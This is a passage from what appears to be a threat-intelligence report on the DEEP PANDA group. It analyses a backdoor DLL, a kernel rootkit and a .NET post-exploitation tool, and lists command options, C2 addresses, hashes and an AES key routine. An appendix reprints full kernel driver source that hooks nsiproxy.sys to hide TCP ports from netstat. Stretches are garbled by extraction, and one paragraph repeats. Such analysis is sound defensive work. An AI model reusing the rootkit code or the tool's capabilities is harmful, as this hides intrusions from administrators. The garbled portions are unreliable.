code appears to have been compiled on Sunday October 30, 2011 at 12:43:33 P.M. UTC (late evening time 
in China).  This sample has multiple communication capabilities available that makes it far more versatile 
and stealthy.  It implements relatively well thought out protocols including HTTP and DNS.  The tool has the 
ability to automatically down select the most effective communication channel once it has been instantiated, 
which can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement.  The 
DLL itself contains traces of the original C++ class names that were utilized in the source code, which in 
JHQHUDO�ZHUH�SUH¿[HG�ZLWK�µ3&&¶���7KH�VDPSOH�VXSSRUWV�WKH�DELOLW\�WR�DFW�DV�D�JHQHULF�SUR[\��WKLV�PD\�EH�
LQWHQGHG�WR�SUR[\�&��WUDI¿F�IRU�RWKHU�LQIHFWHG�PDFKLQHV�LQ�RUGHU�WR�PLQLPL]H�WKH�QXPEHU�RI�V\VWHPV�
communicating to the C2, thus enhancing OPSEC.  The sample contains ‘dead code’ which appears to be 
command and control server classes, this is likely an indicator that the C2 client which would communicate 
with this sample shares the same communications library which was compiled into this sample.
System Driver
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the 
CCRootkit package publicly by Steven Lai (a/k/a embedlinux).  This kernel mode rootkit implements several 
hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL.  
The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the 
source code Steven Lai posted.  This driver attempts to hide a wide swath of TCP ports (40000-45000) for 
an unknown reason, however it is suspected that this may relate to the potential network relaying capability 
alluded to for the backdoor dll.

The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the 
CCRootkit package publicly by Steven Lai (a/k/a embedlinux).  This kernel mode rootkit implements several 
hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL.  
The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the 
source code Steven Lai posted.  This driver attempts to hide a wide swath of TCP ports (40000-45000) for 
an unknown reason, however it is suspected that this may relate to the potential network relaying capability 
alluded to for the backdoor dll.

Implant #2
Backdoor DLL

System Driver

DEEP PANDA





7KH�IROORZLQJ�DUH�FRPPDQG�OLQH�RSWLRQV�LGHQWL¿HG�LQ�WKH�VDPSOH

� Ɣ��iu - impersonate user, iu represents a username and expects the following additional arguments.
� � ż��id -domain
� � ż��ip -password
� Ɣ  f - perform command based on value. Possible values listed below
� � ż��sh - Connect to C2.
� � � Ŷ��x - hostname, connect to http address to download  

Ɣ��y - port
Ɣ��u - username
Ɣ��w - password

� � � Ŷ��l - set up listener
Ɣ��s - hostname
Ɣ��p - port

� � ż��v - display communication protocol version
� � ż��dl���GRZQORDG�¿OH
� � � Ŷ��url - url to download from.
� � � Ŷ��¿OH���SDWK�WR�VDYH�¿OH�WR�
� � ż��ul���XSORDG�¿OH
� � � Ŷ��url - url to upload to.
� � � Ŷ��¿OH���¿OH�WR�XSORDG�
� � ż��cl���UHSODFH�FRQWHQWV�RI�¿OHV�LQ�GLUHFWRU\�S�PDWFKLQJ�ZLOG�FDUG�SDWWHUQ�P�ZLWK�OLVW�RI�
� ����������������UHJH[HV��7KLV�FRPPDQG�ZLOO�VHDUFK�OLQH�E\�OLQH�D�PDWFKLQJ�¿OH�DQG�¿OWHU�RXW�FRQWHQWV�� �
� � ����PDWFKLQJ�WKH�VXSSOLHG�UHJH[HV��LW�ZLOO�WKHQ�VHW�WKH�PRGLI\�FUHDWH�GDWH�WR�WKH�RULJLQDO�¿OH�VR��
      as to hide the tampering.
� � � Ŷ��p - target path
� � � Ŷ��m���¿OH�ZLOG�FDUG�SDWWHUQ
� � � Ŷ���DUJXPHQWV!
� � ż��tu���&RS\�ODVW�DFFHVV��ODVW�PRGLI\�DQG�FUHDWLRQ�WLPH�IURP�¿OH�U��,I�U�GRHV�QRW�H[LVW��D�GHIDXOW��
      date of 11-30-2005:12:00:00 with the UTC offset of the system applied.
� � � Ŷ��p - target path
� � � Ŷ��m���¿OH�ZLOG�FDUG
� � � Ŷ��r���UHIHUHQFH�¿OH�
� � ż��d���GXPS�6\VWHP�,2�)LOH,QIR�IRU�¿OH�W�WR�FRQVROH�
� � � Ŷ��t���SDWK�WR�¿OH
� � ż��wmi - perform Windows Management Instrumentation (WMI) command
� � � Ŷ��s - machine
� � � Ŷ��u - username
� � � Ŷ��p - password
� � � Ŷ��D���NHUEHURV
� � � Ŷ��m - can be one of the following 3 items

APPENDIX 

S  E  N  S  I  T  I  V E 27CROWDSTRIKE

Appendix A: Command Line Options for Post Exploitation Tool Sample (MD5: 
2dce7fc3f52a692d8a84a0c182519133

DEEP PANDA



Appendix B: Algorithm for computing machine ID

Appendix C: Remote Commands Supported by .NET Backdoor Post Exploita-
tion Tool Sample 

Ɣ��TXHU\���UXQ�:0,�TXHU\
� � � � � ż��T���TXHU\
� � � � Ɣ��FDOO���FDOO�:0,
� � � � � ż��T���WDUJHW�WR�FDOO�RQ
� � � � � ż��F���PHWKRG�WR�LQYRNH
� � � � � ż���DUUD\�RI�DUJXPHQWV�WR�WKH�FDOO!
� � � � Ɣ��JHW���GR�QRWKLQJ
� � ż��UD���UXQ�DV
� � � Ŷ��UX���XVHUQDPH
� � � Ŷ��UG���GRPDLQ
� � � Ŷ��US���SDVVZRUG
� � � Ŷ��ZS���ZLWK�SUR¿OH
� � � Ŷ���DUUD\�RI�DUJXPHQWV�IRU�VWDUWSURFHVV!

public class RcDataCommand
{
    public byte channelHint;
    public RcDataCommandId cmdID;
    public RcDataCommandType cmdType;
    public string extraInfo;
    public string string_0;
}

Implemented values for cmdID are as follows:

Ɣ�����&UHDWH6KHOO���([HFXWH�DSSOLFDWLRQ�DQG�VHQG�RXWSXW�WR�&��
Ɣ�����5HDG)LOH���8SORDG�¿OH�WR�&�
Ɣ�����([HFXWH���([HFXWH�DSSOLFDWLRQ�DQG�VHQG�RXWSXW�WR�&�

S  E  N  S  I  T  I  V E 28CROWDSTRIKE

char ch = ‘L’;

foreach(char ch2 in Environment.MachineName)

{

    ch = (char)(ch ^ ch2);

}

byte num3 = (byte)ch;

return (GetVolumeSerial() ^ (uint)(((num3 + (num3 * 0x100)) + (num3 * 

0x10000)) + 

                      (num3 * 0x1000000)));

DEEP PANDA



cmdType can be one of the following (Interesting commands explained in detail):

� Ɣ�����1RQH
� Ɣ�����&RPPDQG
� Ɣ�����,QIR

Ɣ�����(UURU
Ɣ�����+HDUW%HDW
Ɣ�����&KDQQHO&UHDWH
Ɣ�����&KDQQHO%LQG
Ɣ�����&KDQQHO7HUPLQDWH
Ɣ�����&KDQQHO5HTXHVW&UHDWH
Ɣ�����&KDQQHO5HTXHVW&RQ¿UPDWLRQ$FFHSW
Ɣ������&KDQQHO5HTXHVW&RQ¿UPDWLRQ'HQLHG
Ɣ������2EMHFW���H[WUD,QIR�SDUDPHWHU�LV�DQ�;0/�VHULDOL]HG�REMHFW�

ż��VWULQJB��  ����GRZQORDG�D�¿OH�RU��1(7�PRGXOH�
ż��VWULQJB��  ����FRQQHFW�WR�,3�DGGUHVV�

Ɣ������,QLWLOL]H6WULQJ7DEOH
Ɣ������&OHDU0HPRU\)LOHV���FOHDU�OLVW�RI�GRZQORDGHG�PRGXOHV�
Ɣ������/RDG0RGXOH���ORDG�D�SUHYLRXVO\�GRZQORDGHG�PRGXOH

ż��VWULQJB���QDPH�RI�PRGXOH�WR�ORDG�
Ɣ������8QORDG0RGXOH
Ɣ������0RGXOH/LVW5HSRUW
Ɣ������&DOO0RGXOH0HWKRG���&DOO�PHWKRG�LQ�ORDGHG�PRGXOH

ż��VWULQJB���FRQWDLQV�PRGXOH�QDPH�
ż��H[WUD,QIR��FRQWDLQV�DUJXPHQWV�WR�WKH�PHWKRG�

Ɣ������&KDQQHO6SHFL¿HG&RPPDQG
Ɣ������6D\*RRG%\H
Ɣ������&KDQQHO,QLWLDOL]H(UURU
Ɣ������5HTXHVW$VVHPEO\'HSHQGHQW
Ɣ������5HVSRQVH$VVHPEO\'HSHQGHQW
Ɣ������&RQQHFW6XFFHVVHG
Ɣ������&RQQHFW)DLOHG
Ɣ������&KDQQHO5HTXHVW7FS&RQQHFW
Ɣ������&KDQQHO5HTXHVW8GS&RQQHFW
Ɣ�������&XVWRPL]HG

    

S  E  N  S  I  T  I  V E 29CROWDSTRIKE

DEEP PANDA



S  E  N  S  I  T  I  V E 30CROWDSTRIKE

string_0 can have one of the following values dependant upon command id and type.
 
Ɣ��³QHZ�EORFN´
Ɣ��³VHHN´
Ɣ��³VHW�HQG´
Ɣ��³¿QLVK¿OH´
Ɣ��³VWRS´
Ɣ��³VWDUW�FRS\´
Ɣ��³VVRL´
Ɣ��³DERUW´
Ɣ��³(YW´
Ɣ��2WKHU�YDOXHV�FDOFXODWHG�DW�UXQWLPH�

Appendix D: Raw bytes of example Authentication packet. 

Appendix E: Initialization of KEY and IV for AES

03 01 74 80 82 21 b5 64 c2 74 22 e3 02 00 00 00 49 03 00 00 00 00 00 00 00 00 00 00 00                                               
00 00 00

        for (int i = 0; i < 0x20; ++i )

        {       for (int i = 0; i < 0x20; ++i )

        {

            buffer[i] = (byte)((i + 8) + ((byte)password[num++]));

            buffer[i] = (byte)(buffer[i] ^ 170);

            num = num % password.Length;

DEEP PANDA



S  E  N  S  I  T  I  V E 31CROWDSTRIKE

Appendix F: Command & Control Servers

C2 Server

1.9.5.38

Port Geolocation Whois Samples Used In

443 Bukit
Mertajam,
Maylasia

inetnum:        1.9.0.0 - 
1.9.255.255
netname:        
TMNET-AS-AP
descr:          Tmnet, 
Telekom Malaysia 
Bhd.
descr:          Telekom 
Malaysia Berhad
descr:          44th 
Floor, Global Data 
Marketing, TM Global
descr:          Jalan 
Pantai Baharu
country:        MY
admin-c:        TA35-
AP
tech-c:        TA35-AP
mnt-by:        AP-
NIC-HM
mnt-lower:      TM-
NET-AP
mnt-routes:     TM-
NET-AP
status:         ALLO-
CATED PORTABLE
remarks:        -+-+-+-
+-+-+-+-+-+-+-+-++-+-
+-+-+-+-+-+-+-+-+-+-
+-+-+
remarks:        This 
object can only be 
updated by APNIC 
hostmasters.
remarks:        To 
update this object, 
please contact APNIC
remarks:        host-
masters and include 
your organisation’s 
account
remarks:        name in 
the subject line.
remarks:        -+-+-+-
+-+-+-+-+-+-+-+-++-+-
+-+-+-+-+-+-+-+-+-+-
+-+-+
changed:        hm-
changed@apnic.net 
20100610
source:         APNIC

47619fca20895abc83807321cbb80a3d
 

DEEP PANDA



S  E  N  S  I  T  I  V E 32CROWDSTRIKE

C2 Server

202.86.190.3

Port Geolocation Whois Samples Used In

80 Hong Kong inetnum:        
202.86.190.0 - 
202.86.191.255
netname:        Tele-
One-HK
country:        HK
descr:          Te-
leOne(HK) Limited
admin-c:        HL13
tech-c:        AC612-AP
status:         AS-
SIGNED NON-POR-
TABLE
changed:        an-
gus@edu.ctm.net 
20041122
mnt-by:        MAINT-
CTM-MO
source:         APNIC

2dce7fc3f52a692d8a84a0c182519133
de7500fc1065a081180841f32f06a537
 

Appendix G: Edward Sun’s kernel network hook code
       : [ ]NSI Module Hook : Hiding Port Under Windows Vista [ ]

  : eviloctal    : 2007-7-8 20:53      : [ ]NSI Module 

Hook : Hiding Port Under Windows Vista 

   ˖http://rootkit.com/newsread_print.php?newsid=735

(www.eviloctal.com)

cardmagic writes: Windows Vista has changed alot on network module, many old 

port hiding materials are no longer usable.

In this post, I will share with you a simple code to hide port under Vista,hope 

it is useful for some guys .

Actually under Windows Vista, netstat.exe will call InternalGetTcpTable2 which 

is exported by Iphlpapi.dll to list all open ports,then InternalGetTcpTable2 

will transfer control to NsiAllocateAndGetTable which is exported by nsi.dll, 

DQG�¿QDOO\�QVL�GOO�LQYROYH�1VL(QXPHUDWH2EMHFWV$OO3DUDPHWHUV([�WR�LQWHUDFW�ZLWK�
kernel mode module of NSI -- nsiproxy.sys. nsiproxy.sys is almost like a 

wrapper of netio.sys, it will then call internal subroutines of netio.sys .

Here ,we will use a relatively easy way -- “NSI Kernel Module Dispatch Routine 

+RRN´�WR�GHPRVWUDWH�WKH�VSHFL¿HG�SRUW�KLGLQJ�XQHU�9LVWD��'LVSDWFK�URXWLQH�KRRN�
is an old topic, this time ,we will apply this method to nsiproxy.sys. Please 

IRFXV�RQ�KRZ�WR�KDQGOH�WKH�FRQWHQW�¿OWHULQJ�RI�16,��
Check the following code(Notice: I only tested it under Windows Vista RTM 

32bit): 

DEEP PANDA



:

///////////////////////////////////////////////////////////////////////////////

////////

// Filename: PortHidDemo_Vista.c

//

// Author: CardMagic(Edward)

// Email: [email]sunmy1@sina.com[/email]

���061��RQO\RQHMD]]�DW�KRWPDLO�FRP
//

// Description:

//      A Demostration Of Hiding

��������6SHFL¿HG�3RUW�8QGHU�:LQGRZV�9LVWD�570���ELW�
//   Tested Under Windows Vista Kernel Version 6000 MP (1 procs) Free x86 com-

patible

//

//

#include “stdlib.h”

#include “ntifs.h”

unsigned short htons(unsigned short hostshort);

unsigned long inet_addr(const char *name);

typedef unsigned long DWORD;

�GH¿QH�/2&$/+,'(,3�³������������´
�GH¿QH�/2&$/+,'(3257����

�GH¿QH�,2&7/B16,B*(7$//3$5$0��[�����%

H[WHUQ�32%-(&7B7<3(�,R'HYLFH2EMHFW7\SH�,R'ULYHU2EMHFW7\SH�
3'5,9(5B2%-(&7�S1VL'UY2EM� ���
PDRIVER_DISPATCH orgNsiDeviceIoControl = 0;

DWORD gLocalPort=0,gLocalIp=0;

typedef struct _HP_CONTEXT

{

  PIO_COMPLETION_ROUTINE oldIocomplete;

  PVOID oldCtx;  

  BOOLEAN bShouldInvolve;

  PKPROCESS pcb;

}HP_CONTEXT,*PHP_CONTEXT;

S  E  N  S  I  T  I  V E 33CROWDSTRIKE

DEEP PANDA



}INTERNAL_TCP_TABLE_SUBENTRY,*PINTERNAL_TCP_TABLE_SUBENTRY;

typedef struct _INTERNAL_TCP_TABLE_ENTRY

{

  INTERNAL_TCP_TABLE_SUBENTRY localEntry;

  INTERNAL_TCP_TABLE_SUBENTRY remoteEntry;

  

}INTERNAL_TCP_TABLE_ENTRY,*PINTERNAL_TCP_TABLE_ENTRY;

typedef struct _NSI_STATUS_ENTRY

{

��FKDU�E\WHV¿OO>��@�

}NSI_STATUS_ENTRY,*PNSI_STATUS_ENTRY;

typedef struct _NSI_PARAM

{

  //

  // Total 3CH size

  //

  DWORD UnknownParam1;

  DWORD UnknownParam2;

  DWORD UnknownParam3;

  DWORD UnknownParam4;

  DWORD UnknownParam5;

  DWORD UnknownParam6;

  PVOID lpMem;

  DWORD UnknownParam8;

  DWORD UnknownParam9;

  DWORD UnknownParam10;

  PNSI_STATUS_ENTRY lpStatus;

  DWORD UnknownParam12;

  DWORD UnknownParam13;

  DWORD UnknownParam14;

  DWORD TcpConnCount;

}NSI_PARAM,*PNSI_PARAM;

unsigned short htons(unsigned short a)

{

  unsigned short b = a;

  b = ( b << 8 );

  a = ( a >> 8 );

  return ( a | b );

};

S  E  N  S  I  T  I  V E 34CROWDSTRIKE

DEEP PANDA



S  E  N  S  I  T  I  V E 35CROWDSTRIKE

unsigned long inet_addrt(const char* name)

{

��LQW�L�M�S�
  int len = strlen(name);

  unsigned long temp_val[4];

  char namesec[10] ;

��IRU�L� ���M� ��S� ��L���OHQ�L���
  {

    memset(namesec,0,10);

    if(&#39;.&#39; == name[i])

    {

      if(p)

        strncpy(namesec,name+p+1,i-p);

      else

        strncpy(namesec,name,i);

������WHPSBYDO>M@� �DWRL�QDPHVHF��
������M���
      p = i;

    }

  }

  strncpy(namesec,name+p+1,i-p);

��WHPSBYDO>M@� �DWRL�QDPHVHF��

  return (temp_val[0]|(temp_val[1]<<8)|(temp_val[2]<<16)|(temp_val[3]<<24));

}

NTSTATUS

HPCompletion(

������,1�3'(9,&(B2%-(&7�'HYLFH2EMHFW�
      IN PIRP Irp,

      IN PVOID Context

      )

{

  PIO_STACK_LOCATION irpsp = IoGetCurrentIrpStackLocation(Irp);

  PIO_STACK_LOCATION irpspNext = IoGetNextIrpStackLocation(Irp);

  PHP_CONTEXT pCtx = Context;

  PNSI_PARAM nsiParam;

  int i;

  

  if(NT_SUCCESS(Irp->IoStatus.Status))

  {

    

DEEP PANDA



S  E  N  S  I  T  I  V E 36CROWDSTRIKE

nsiParam = Irp->UserBuffer;

    if(MmIsAddressValid(nsiParam->lpMem))

    {

      //

      // netstat will involve internal calls which will use

      // nsiParam structure

      //

      if(  (nsiParam->UnknownParam8 == 0x38))

      {

        KAPC_STATE apcstate;

        PNSI_STATUS_ENTRY pStatusEntry = (PNSI_STATUS_ENTRY)nsiParam->lpStatus;

        PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)nsi-

Param->lpMem;

        int nItemCnt = nsiParam->TcpConnCount;

        

        KeStackAttachProcess(pCtx->pcb,&apcstate);

        //

        //make sure we are in the context of original process

        //

        for(i = 0;i < nItemCnt;i ++)

        {

          if((pTcpEntry[i].localEntry.dwIP == gLocalIp)&&(pTcpEntry[i].localEn-

try.Port == gLocalPort))

          {

            //

            //NSI will map status array entry to tcp table array entry

            //we must modify both synchronously

            //

            RtlCopyMemory(&pTcpEntry[i],&pTcpEntry[i+1],sizeof(INTERNAL_TCP_TA-

BLE_ENTRY)*(nItemCnt-i));

            RtlCopyMemory(&pStatusEntry[i],&pStatusEntry[i+1],sizeof(NSI_STA-

TUS_ENTRY)*(nItemCnt-i));

            nItemCnt--;

            nsiParam->TcpConnCount --;

            i--;   

          }

        }

        KeUnstackDetachProcess(&apcstate);

      }

    }

  }

 

DEEP PANDA



S  E  N  S  I  T  I  V E 37CROWDSTRIKE

irpspNext->Context = pCtx->oldCtx;

  irpspNext->CompletionRoutine = pCtx->oldIocomplete;

  

  //

  //free the fake context

  //

  ExFreePool(Context);

  if(pCtx->bShouldInvolve)

����UHWXUQ�LUSVS1H[W�!&RPSOHWLRQ5RXWLQH�'HYLFH2EMHFW�,US�&RQWH[W��
  else

  {

    if (Irp->PendingReturned) {

      IoMarkIrpPending(Irp);

    }

    return STATUS_SUCCESS;

  }

}

NTSTATUS

2E5HIHUHQFH2EMHFW%\1DPH��
������������,1�381,&2'(B675,1*�2EMHFW1DPH�
            IN ULONG Attributes,

            IN PACCESS_STATE AccessState OPTIONAL,

            IN ACCESS_MASK DesiredAccess OPTIONAL,

������������,1�32%-(&7B7<3(�2EMHFW7\SH�
            IN KPROCESSOR_MODE AccessMode,

            IN OUT PVOID ParseContext OPTIONAL,

������������287�392,'�2EMHFW
            );

1767$786�+38QORDG�,1�3'5,9(5B2%-(&7�'ULYHU2EMHFW�
{

  LARGE_INTEGER waittime;

  waittime.QuadPart = -50*1000*1000;

��,QWHUORFNHG([FKDQJH�	�S1VL'UY2EM�!0DMRU)XQFWLRQ>,53B0-B'(9,&(B&21752/@���RU-
gNsiDeviceIoControl);

//

  //delay loading driver to make it more secure

  //

DEEP PANDA



S  E  N  S  I  T  I  V E 38CROWDSTRIKE

KeDelayExecutionThread(KernelMode,0,&waittime);

  return STATUS_SUCCESS;

}

  

NTSTATUS HPDummyDeviceIoControl(

����������������,1�3'(9,&(B2%-(&7�'HYLFH2EMHFW�
                IN PIRP Irp

                )

{

  ULONG     ioControlCode;

  PIO_STACK_LOCATION irpStack;

  ULONG     status;

  irpStack = IoGetCurrentIrpStackLocation(Irp);

  ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

  if(IOCTL_NSI_GETALLPARAM == ioControlCode)

  {

    if(irpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_

PARAM))

    {

      //

      //only care the related I/O

      //

      PHP_CONTEXT ctx = (HP_CONTEXT*)ExAllocatePool(NonPagedPool,sizeof(HP_CON-

TEXT));

      ctx->oldIocomplete = irpStack->CompletionRoutine;

      ctx->oldCtx = irpStack->Context;

      irpStack->CompletionRoutine = HPCompletion;

      irpStack->Context = ctx;

      ctx->pcb = IoGetCurrentProcess();

      if((irpStack->Control&SL_INVOKE_ON_SUCCESS) ==SL_INVOKE_ON_SUCCESS)

        ctx->bShouldInvolve = TRUE;

      else

        ctx->bShouldInvolve = FALSE;

      irpStack->Control |= SL_INVOKE_ON_SUCCESS;        

    }

  }

DEEP PANDA



S  E  N  S  I  T  I  V E 39CROWDSTRIKE

//

  //call original I/O control routine

  //

��VWDWXV� �RUJ1VL'HYLFH,R&RQWURO�'HYLFH2EMHFW�,US��

  return status;

}

NTSTATUS DriverEntry(

���������,1�3'5,9(5B2%-(&7�'ULYHU2EMHFW�
         IN PUNICODE_STRING RegistryPath

          )

{

  int i;

  NTSTATUS status;

  UNICODE_STRING uniNsiDrvName;

  

#if DBG

    _asm int 3 //debug

#endif

��'ULYHU2EMHFW�!'ULYHU8QORDG� �+38QORDG�

  RtlInitUnicodeString(&uniNsiDrvName,L”\\Driver\\nsiproxy”);

��VWDWXV� �2E5HIHUHQFH2EMHFW%\1DPH�	XQL1VL'UY1DPH�2%-B&$6(B,16(16,-
7,9(�18//���,R'ULYHU2EMHFW7\SH�.HUQHO0RGH�18//�	S1VL'UY2EM��

  if(!NT_SUCCESS(status))

  {

    return STATUS_SUCCESS; 

  }

  //

  //store the original dispatch function of NSI driver

  //

��RUJ1VL'HYLFH,R&RQWURO� �S1VL'UY2EM�!0DMRU)XQFWLRQ>,53B0-B'(9,&(B&21752/@�
  

  gLocalIp = inet_addrt(LOCALHIDEIP);

  gLocalPort = htons(LOCALHIDEPORT);

DEEP PANDA



S  E  N  S  I  T  I  V E 40CROWDSTRIKE

  //

  //hook NSI dispatch routine

  //

,QWHUORFNHG([FKDQJH�	�S1VL'UY2EM�!0DMRU)XQFWLRQ>,53B0-B'(9,&(B&21752/@���+3'XP-
myDeviceIoControl);

  return STATUS_SUCCESS;

}

DEEP PANDA



S  E  N  S  I  T  I  V E 41CROWDSTRIKE

Appendix H: Command and Control MD5 Correlation

MD5 Command and Control Server

47619fca20895abc83807321cbb80a3d
2dce7fc3f52a692d8a84a0c182519133 
de7500fc1065a081180841f32f06a537

1.9.5.38:443 
202.86.190.3:80 
202.86.190.3:80

DEEP PANDA


